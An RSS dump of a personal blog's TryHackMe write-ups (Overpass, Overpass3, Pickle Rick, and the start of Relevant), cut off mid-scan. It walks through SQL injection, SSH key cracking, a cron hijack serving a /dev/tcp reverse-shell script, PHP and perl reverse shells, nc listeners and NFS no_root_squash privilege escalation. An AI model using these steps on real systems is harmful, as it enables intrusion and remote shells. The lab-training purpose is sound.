&lt;p&gt;lets try a basic sql injection: &lt;code&gt;69 OR 1=1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;hellip;&lt;/p&gt;
&lt;p&gt;works!&lt;/p&gt;
&lt;p&gt;okay so name of the person is james and &amp;hellip; we have the ssh private key printed out lmao.&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;lets try:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;❯ ssh -i key james@BOX_IP&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;key: the rsa key&lt;/li&gt;
&lt;li&gt;james: the username&lt;/li&gt;
&lt;li&gt;BOX_IP: IP address of the box.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;password protected ;-; ok so lets take that key and convert it into a better format.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python ssh2john.py id_rsa &amp;gt; id_rsa.hash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;time to brute-forcing!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ john hash -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/ciphers [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
*******          (key)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:07 DONE (2021-02-02 23:49) 0.1385g/s 1986Kp/s 1986Kc/s 1986KC/sa6_123..*7¡Vamos!
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;key hidden :)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ ssh -i key james@BOX_IP
Enter passphrase for key &#39;key&#39;: 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&amp;rsquo;m in!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;james@overpass-prod:~$ cat todo.txt 
To Do:
&amp;gt; Update Overpass&#39; Encryption, Muirland has been complaining that it&#39;s not strong enough
&amp;gt; Write down my password somewhere on a sticky note so that I don&#39;t forget it.
  Wait, we make a password manager. Why don&#39;t I just use that?
&amp;gt; Test Overpass for macOS, it builds fine but I&#39;m not sure it actually works
&amp;gt; Ask Paradox how he got the automated build script working and where the builds go.
  They&#39;re not updating on the website
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ok so lets copy linpeas to find any issues:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;❯ scp -i path/to/key /path/to/linpeas.sh james@BOX_IP:/destination/path&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;now,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;james@overpass-prod:~$ chmod +x linpeas.sh 
james@overpass-prod:~$ ./linpeas.sh 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;hmm. so we have &lt;code&gt;/etc/hosts&lt;/code&gt; available to edit&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.1.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and since there&amp;rsquo;s some talk about automated build scipts, we should go look at cron.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ah yeas. look at the last one. it runs every minute, as root. only if we could change the hosting location of &lt;code&gt;overpass.thm&lt;/code&gt; &amp;hellip; oh wait&lt;/p&gt;
&lt;p&gt;so lets edit &lt;code&gt;/etc/hosts&lt;/code&gt;&amp;rsquo;s &lt;code&gt;overpass.thm&lt;/code&gt; to our own ip, and setup a python server using:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ sudo python3 -m http.server 80
[sudo] password for tanishq: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;note the port 80 since that curl is going to look in the default port. Now, wherever you started this server, from this location onwards, we need to have this exact structure &lt;code&gt;/downloads/src/buildscript.sh&lt;/code&gt;, so&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;❯ mkdir downloads&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;❯ cd downloads&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;❯ mkdir src&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;❯ cd src&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;❯ echo &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/MY_IP/4242 0&amp;gt;&amp;amp;1&amp;quot; &amp;gt; buildscript.sh&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;this lets us pretend to be a server, serving that &lt;code&gt;buildscript.sh&lt;/code&gt; file :)&lt;/p&gt;
&lt;p&gt;we are telling the sever to send us a tcp connection to our own ip on the port &lt;code&gt;4242&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Meanwhile, setup netcat using:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;❯ nc -nlvp 4242&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-l: listen mode, for inbound connects&lt;/li&gt;
&lt;li&gt;-n: numeric-only IP addresses, no DNS&lt;/li&gt;
&lt;li&gt;-v: verbose [use twice to be more verbose]&lt;/li&gt;
&lt;li&gt;-p port: local port number&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;and we are all in!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Overpass3 Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-overpass3-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-overpass3-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/ElTbvct.jpg" alt="Featured image of post TryHackMe: Overpass3 Writeup" /&gt;&lt;h2 id=&#34;1-recon&#34;&gt;1. Recon&lt;/h2&gt;
&lt;p&gt;we run the nmap scan and the gobuster parallely, while we explore the website.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1 Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;❯ nmap -script=vuln -sV -A -T4 -Pn 10.10.16.10
Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 21:54 EST
Nmap scan report for 10.10.16.10
Host is up (0.52s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_sslv2-drown: 
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
| http-enum: 
|   /backups/: Backup folder w/ directory listing
|_  /icons/: Potentially interesting folder w/ directory listing
|_http-server-header: Apache/2.4.37 (centos)
|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.52 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;12-web-enumeration--exploration&#34;&gt;1.2 Web Enumeration + Exploration&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;❯ gobuster dir -u 10.10.16.10 -w &amp;quot;/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt&amp;quot; -x &amp;quot;html,php,txt&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;well this didn&amp;rsquo;t workout well. But, from the nmap scan, we have two directories listed:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/backups/ &amp;amp; /icons/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/icons/&lt;/code&gt; did not have anything interesting, so lets look at &lt;code&gt;/backups/&lt;/code&gt;. We have a zip file as &lt;code&gt;backup.zip&lt;/code&gt;. Downloading and unzipping,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ unzip backup.zip
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg  
  inflating: priv.key 
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ gpg --import priv.key
gpg: key C9AE71AB3180BC08: &amp;quot;Paradox &amp;lt;paradox@overpass.thm&amp;gt;&amp;quot; not changed
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ gpg CustomerDetails.xlsx.gpg
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      &amp;quot;Paradox &amp;lt;paradox@overpass.thm&amp;gt;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nice, we have all the customer details neatly bundled up for us. Now, lets convert the &lt;code&gt;xlsx&lt;/code&gt; to &lt;code&gt;pdf&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;So we have some customer names and their username-password combinations and, some credit card information XD&lt;/p&gt;
&lt;h3 id=&#34;13-ftp&#34;&gt;1.3 FTP&lt;/h3&gt;
&lt;p&gt;lets try logging in using this from ftp. &lt;code&gt;paradox&lt;/code&gt; username works! okay okay. lets try putting a file on the server using &lt;code&gt;put filename&lt;/code&gt;. So that works too. Lets upload a php reverse shell and see how that works. Don&amp;rsquo;t forget to change the &lt;code&gt;$ip&lt;/code&gt; to your &lt;code&gt;tun0&lt;/code&gt;, or the relevant &lt;code&gt;tun&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ ftp 10.10.181.222
...
ftp&amp;gt; pwd
257 &amp;quot;/&amp;quot; is the current directory
ftp&amp;gt; put phpreverseshell.php
...
ftp&amp;gt; ls
...
-rw-r--r--    1 1001     1001         5494 Mar 07 03:10 phpreverseshell.php
226 Directory send OK.
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;Setup netcat to listen on the port specified. I did not change so its &lt;code&gt;1337&lt;/code&gt; for me.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;❯ nc -lnvp 1337&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;So, lets execute the shell on there. How? just curl!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;❯ curl 10.10.16.10/shell.php&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.181.222] 38004
Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 03:12:19 up 17 min,  0 users,  load average: 0.00, 0.41, 0.89
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (874): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ whoami
whoami
apache
sh-4.4$ pwd
/
pwd
sh-4.4$ 
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3-priv-esc&#34;&gt;3. Priv Esc&lt;/h2&gt;
&lt;p&gt;let&amp;rsquo;s first get the web flag:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sh-4.4$ cd ~
cd ~
sh-4.4$ ls
ls
error
icons
noindex
web.flag
sh-4.4$ cat web.flag
cat web.flag
thm{NOICE}
sh-4.4$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Converting to a python shell using &lt;code&gt;python3 -c &amp;quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&amp;quot;&lt;/code&gt;, lets focus on privesc.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bash-4.4$ su paradox
su paradox
Password: {mmm_tasty}

[paradox@localhost html]$ whoami
whoami
paradox
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since we can transfer files using ftp, we can put in &lt;code&gt;linpeas.sh&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Searching ssl/ssh files
/home/paradox/.ssh/authorized_keys                              
/home/paradox/.ssh/id_rsa.pub  /usr/bin/passwd
Possible private SSH keys were found!
/home/paradox/priv.key
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                          
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)           
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;Files with capabilities:
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay. the NFS thing was full red in color. &lt;a class=&#34;link&#34; href=&#34;http://blog.serverbuddies.com/why-we-should-not-use-the-no_root_squash-option/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Why no_root_squash is not a good idea&lt;/a&gt;. We have lots of scope there. To find out what port its running on, we can look at the nmap scan results. However, we can&amp;rsquo;t see it there. It must be filtered or blocked. In any case, we can look for it, by:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[paradox@localhost home]$ rpcinfo -p
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  49444  status
    100024    1   tcp  45735  status
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  56460  nlockmgr
    100021    3   udp  56460  nlockmgr
    100021    4   udp  56460  nlockmgr
    100021    1   tcp  32803  nlockmgr
    100021    3   tcp  32803  nlockmgr
    100021    4   tcp  32803  nlockmgr
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Its at the port 2049, which is the default for NFS.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ ssh paradox@10.10.181.222 -L 2049:localhost:2049
Enter passphrase for key &#39;/home/tanishq/.ssh/id_rsa&#39;: 
Last login: Sun Mar  7 04:22:48 2021 from 10.8.150.214
[paradox@localhost ~]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ sudo mount -v -t nfs localhost:/ /home/tanishq/mnt
mount.nfs: timeout set for Sun Mar  7 00:12:57 2021
mount.nfs: trying text-based options &#39;vers=4.2,addr=::1,clientaddr=::1&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;total 1228
drwx------  3 tanishq tanishq     124 Mar  7 00:36 .
drwxr-xr-x 33 tanishq tanishq    4096 Mar  7 00:36 ..
-rwxr-xr-x  1 root    root    1234376 Mar  7 00:36 bash
lrwxrwxrwx  1 root    root          9 Nov  8 16:45 .bash_history -&amp;gt; /dev/null
-rw-r--r--  1 tanishq tanishq      18 Nov  8  2019 .bash_logout
-rw-r--r--  1 tanishq tanishq     141 Nov  8  2019 .bash_profile
-rw-r--r--  1 tanishq tanishq     312 Nov  8  2019 .bashrc
drwx------  2 tanishq tanishq      61 Nov  7 21:20 .ssh
-rw-------  1 tanishq tanishq      38 Nov 17 16:15 user.flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;❯ cat id_rsa &amp;gt;&amp;gt; /relevant/path/here/james.key&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ chmod 600 james.key
❯ ssh -i james.key james@10.10.179.112
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
[james@localhost ~]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;[james@localhost ~]$ ls
bash  user.flag
[james@localhost ~]$ ./bash
./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash)
bash-5.1$ whoami
james
bash-5.1$ ./bash -p
./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash)
bash-5.1# whoami
root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;:D&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Pickle Rick Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-pickle-rick-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-pickle-rick-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/NLn7Ikj.jpg" alt="Featured image of post TryHackMe: Pickle Rick Writeup" /&gt;&lt;h2 id=&#34;1-recon&#34;&gt;1. Recon&lt;/h2&gt;
&lt;p&gt;lets look at the website first. Okay. Nothing special. Looking at the source we have something in the comments:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
  &amp;lt;!--

    Note to self, remember username!

    Username: R1ckRul3s

  --&amp;gt;

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;nice.
lets try running gobuster meanwhile, along with nmap.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ nmap -script=default -sV -A -T4 10.10.106.44
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 21:19 EST
Nmap scan report for 10.10.106.44
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac:a3:87:da:73:ba:1a:d5:e1:22:6a:2a:8b:e5:47:be (RSA)
|   256 b7:59:da:b6:2a:7f:b4:2b:89:f5:b1:13:76:ef:a6:d7 (ECDSA)
|_  256 fc:8d:ba:fa:d8:72:41:b7:d5:1b:c7:06:0c:ca:a4:1d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.35 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ gobuster dir -u 10.10.106.44 -w &amp;quot;/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt&amp;quot; -x &amp;quot;html,php,txt&amp;quot;
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.106.44
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2021/02/17 21:20:31 Starting gobuster
===============================================================
/index.html (Status: 200)
/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;okay. very interesting stuff. let&amp;rsquo;s try it one by one.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;assets/&lt;/code&gt; show&lt;/p&gt;
&lt;p&gt;&lt;code&gt;robots.txt&lt;/code&gt; shows another interesting word.&lt;/p&gt;
&lt;p&gt;interestingly, when i go to &lt;code&gt;portal.php&lt;/code&gt;, it redirects me to &lt;code&gt;login.php&lt;/code&gt;. Maybe there is something there? lets see it in burpsuite.&lt;/p&gt;
&lt;p&gt;Nothing. a simple redirect. Okay so lets only look at &lt;code&gt;login.php&lt;/code&gt;. Maybe there is an XSS attack we care looking at &amp;hellip; nope. tried and didnt work.&lt;/p&gt;
&lt;p&gt;But what if &amp;hellip; we have both the username and the password already with us? :D&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;So we have a command pannel and we can execute stuff. hmmm.&lt;/p&gt;
&lt;p&gt;And, we are at the &lt;code&gt;portal.php&lt;/code&gt; page. gg.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ls&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;so denied is &amp;hellip; well something we should expect to pop onto us as an error soon.&lt;/p&gt;
&lt;p&gt;It also looks like the &lt;code&gt;cat&lt;/code&gt; command is disabled. So, lets try alternatives &amp;hellip;
&lt;code&gt;less&lt;/code&gt; works!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;less clue.txt&lt;/code&gt;: &lt;code&gt;Look around the file system for the other ingredient.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;okay &amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;less Sup3rS3cretPickl3Ingred.txt&lt;/code&gt;: &lt;code&gt;*** ******* ****&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;eww, but yay!&lt;/p&gt;
&lt;p&gt;Okay. so now i&amp;rsquo;m trying to &lt;code&gt;cd ..&lt;/code&gt; but it doesn&amp;rsquo;t wanna work. we did have the ssh port open, so &amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ ssh R1ckRul3s@10.10.106.44
The authenticity of host &#39;10.10.106.44 (10.10.106.44)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:LWuQ+4VfPBKeYlbudgcUF9iFM6hG7u/vjzjziKLavsk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;10.10.106.44&#39; (ECDSA) to the list of known hosts.
R1ckRul3s@10.10.106.44: Permission denied (publickey).
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;so first we need to put our public key in the list of ssh&amp;rsquo;s &lt;code&gt;authorized_keys&lt;/code&gt; file. But how do we get in &amp;hellip;?&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s try settup up &lt;code&gt;nc&lt;/code&gt; and get a bash reverse shell going on. Get your own ip by &lt;code&gt;❯ ifconfig tun0&lt;/code&gt;. I&amp;rsquo;m taking the reverse shells from &lt;code&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ nc -lnvp 4242
listening on [any] 4242 ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;hmm. bash gives nothing.
let&amp;rsquo;s try perl.&lt;/p&gt;
&lt;h2 id=&#34;3-priviledge-escalation&#34;&gt;3. Priviledge Escalation&lt;/h2&gt;
&lt;p&gt;So perl reverse shell works! Now, let&amp;rsquo;s upgrade our shell by &lt;code&gt;$ python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-dataÄip-10-10-106-44:/home/rick$ whoami
whoami
www-data
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;www-dataÄip-10-10-106-44:/home/ubuntu$ ls -la
ls -la
total 40
drwxr-xr-x 4 ubuntu ubuntu 4096 Feb 10  2019 .
drwxr-xr-x 4 root   root   4096 Feb 10  2019 ..
-rw------- 1 ubuntu ubuntu  320 Feb 10  2019 .bash_history
-rw-r--r-- 1 ubuntu ubuntu  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Aug 31  2015 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .cache
-rw-r--r-- 1 ubuntu ubuntu  655 May 16  2017 .profile
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Feb 10  2019 .sudo_as_admin_successful
-rw------- 1 ubuntu ubuntu 4267 Feb 10  2019 .viminfo
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We could try ssh into the system for a proper shell, but I want to check if we have some low hanging fruits here. That is, do we have root permissions?&lt;/p&gt;
&lt;p&gt;exploring, we have:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-dataÄip-10-10-106-44:/home/rick$ ls -la      
ls -la
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;www-data@ip-10-10-86-16:/home/rick$ cat &#39;second ingredients&#39;
cat &#39;second ingredients&#39;
* ***** ****
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;:stonks:
1 jerry tear
wait what&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ip-10-10-86-16:/home/rick$ sudo -l
sudo -l
Matching Defaults entries for www-data on
    ip-10-10-86-16.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-86-16.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;so we have all the permissions without password lmao&lt;/p&gt;
&lt;p&gt;so much for &amp;lsquo;priv esc&amp;rsquo; XD&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ip-10-10-86-16:/$ sudo ls /root/
sudo ls /root/
3rd.txt  snap
www-data@ip-10-10-86-16:/$ sudo cat /root/3rd.txt
sudo cat /root/3rd.txt
3rd ingredients: ***** *****
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PWNED!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Relevant Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-relevant-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-relevant-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/AG5H2Sg.jpg" alt="Featured image of post TryHackMe: Relevant Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/relevant&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-enumeration--exploration&#34;&gt;1. Enumeration &amp;amp; Exploration&lt;/h2&gt;
&lt;p&gt;Note: All of the below may look sequential, but are done is parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1 Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 995 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
